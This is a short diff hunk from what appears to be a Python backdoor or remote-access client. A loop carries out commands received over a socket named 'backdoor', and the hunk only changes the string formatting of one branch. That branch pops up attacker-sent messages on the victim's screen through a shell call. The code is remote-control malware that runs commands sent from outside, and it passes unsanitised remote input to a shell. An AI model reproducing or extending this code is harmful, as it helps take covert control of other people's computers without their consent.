@@ -67,7 +67,7 @@ while True:
     elif first == "4":
         message = backdoor.recv(1024)
         decodedMessage = message.decode()
-        subprocess.Popen("msg %username% {}".format(decodedMessage),shell=True)
+        subprocess.Popen(f"msg %username% {decodedMessage}",shell=True)
 
     elif first == "5":
         currentDirec = subprocess.Popen("cd",stdout=subprocess.PIPE, stderr=subprocess.PIPE,
